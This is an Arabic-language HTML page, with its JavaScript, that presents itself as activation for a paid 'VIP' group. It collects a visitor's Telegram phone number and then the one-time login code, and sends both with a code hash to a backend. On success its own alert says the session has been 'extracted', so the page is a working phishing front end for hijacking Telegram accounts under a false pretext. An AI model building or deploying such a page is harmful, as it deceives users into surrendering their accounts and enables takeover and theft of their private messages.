<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>الانضمام للمجموعة المدفوعة | VIP</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; font-family: 'Cairo', sans-serif; }
    body {
      background: linear-gradient(135deg, #131e29 0%, #0b1118 100%);
      color: #ffffff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }
    .card {
      background: #1e2c3a;
      border: 1px solid #2a3d52;
      padding: 30px;
      border-radius: 24px;
      width: 100%;
      max-width: 420px;
      text-align: center;
      box-shadow: 0 15px 35px rgba(0,0,0,0.6);
    }
    .vip-badge {
      background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
      color: #fff;
      padding: 6px 16px;
      border-radius: 30px;
      font-size: 13px;
      font-weight: 700;
      display: inline-block;
      margin-bottom: 15px;
    }
    h2 { margin: 10px 0; font-size: 24px; color: #ffffff; }
    p { color: #93c5fd; font-size: 14px; margin-bottom: 25px; line-height: 1.6; }
    input {
      width: 100%;
      padding: 14px;
      margin-bottom: 20px;
      border-radius: 12px;
      border: 2px solid #364353;
      background: #0f172a;
      color: #fff;
      font-size: 18px;
      text-align: center;
      outline: none;
    }
    input:focus { border-color: #3b82f6; }
    button {
      background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
      color: white;
      border: none;
      padding: 15px;
      border-radius: 12px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      width: 100%;
      box-shadow: 0 4px 15px rgba(37, 99, 235, 0.4);
    }
    #codeSection { display: none; }
  </style>
</head>
<body>

  <div class="card">
    <div class="vip-badge">🌟 مجموعة VIP الحصرية</div>
    <h2 id="title">تفعيل اشتراك المجموعة</h2>
    <p id="statusDesc">أدخل رقم هاتفك المرتبط بتيليغرام لبدء عملية التفعيل.</p>

    <!-- خطوة إدخال الهاتف -->
    <div id="phoneSection">
      <input type="text" id="phoneInput" placeholder="مثال: +9639xxxxxxxx">
      <button onclick="sendCode()">إرسال رمز التفعيل</button>
    </div>

    <!-- خطوة إدخال الكود -->
    <div id="codeSection">
      <input type="text" id="codeInputs" placeholder="أدخل الرمز (5 أو 6 أرقام)" maxlength="10">
      <button onclick="verifyCode()">تأكيد الرمز والانضمام</button>
    </div>
  </div>

  <script>
    let globalPhoneHash = "";
    let globalPhone = "";

    async function sendCode() {
      const phone = document.getElementById('phoneInput').value.trim();
      if (!phone) {
        alert('الرجاء إدخال رقم الهاتف بشكل صحيح');
        return;
      }
      globalPhone = phone;

      const btn = event.target;
      btn.innerText = "جاري الإرسال...";
      btn.disabled = true;

      try {
        const response = await fetch('/api/send-code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phone })
        });
        const result = await response.json();

        if (result.success) {
          globalPhoneHash = result.phoneCodeHash;
          document.getElementById('title').innerText = "أدخل رمز التفعيل";
          document.getElementById('statusDesc').innerText = "تم إرسال الرمز إلى تطبيق تيليغرام الخاص بك:";
          document.getElementById('phoneSection').style.display = 'none';
          document.getElementById('codeSection').style.display = 'block';
        } else {
          alert('خطأ: ' + result.error);
          btn.innerText = "إرسال رمز التفعيل";
          btn.disabled = false;
        }
      } catch (err) {
        alert('تعذر الاتصال بالسيرفر.');
        btn.innerText = "إرسال رمز التفعيل";
        btn.disabled = false;
      }
    }

    async function verifyCode() {
      const code = document.getElementById('codeInputs').value.trim();
      if (!code) {
        alert('الرجاء إدخال الرمز');
        return;
      }

      try {
        const response = await fetch('/api/verify-code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            phoneNumber: globalPhone,
            phoneCode: code,
            phoneCodeHash: globalPhoneHash
          })
        });

        const result = await response.json();
        if (result.success) {
          alert('🎉 مبروك! تم التحقق بنجاح واستخراج الجلسة.');
          document.getElementById('title').innerText = "تم الانضمام بنجاح!";
          document.getElementById('statusDesc').innerText = "أنت الآن عضو معتمد في مجموعة الـ VIP.";
          document.getElementById('codeSection').style.display = 'none';
        } else {
          alert('خطأ: ' + result.error);
        }
      } catch (err) {
        alert('حدث خطأ أثناء التأكيد.');
      }
    }
  </script>
</body>
</html>
